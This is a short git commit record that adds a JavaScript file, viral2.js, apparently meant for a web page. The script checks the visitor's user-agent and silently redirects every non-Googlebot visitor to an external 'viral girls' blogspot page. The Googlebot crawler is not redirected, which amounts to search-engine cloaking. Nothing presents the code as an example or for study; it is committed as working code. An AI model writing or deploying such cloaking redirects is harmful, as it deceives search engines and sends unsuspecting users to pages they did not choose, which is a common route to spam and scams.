af2086a2b3059cbdffe455ea3d660b4b18a25d8d
sportsworldtv <newnewkhota@gmail.com>
2026-08-29 19:49:52 +0600

    Add files via upload

---
+++ viral2.js
@@ -0,0 +1,8 @@
+  // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
+if (!navigator.userAgent.includes('Googlebot')) {
+  // Redirect only normal users
+  window.location.href = "http://in-viral-girls.blogspot.com/2026/08/viral11.html?m=1&github";
+} else {
+  // For search engine crawlers, you can choose to perform a different action or not redirect
+  console.log("THanks for visiting my page");
+}
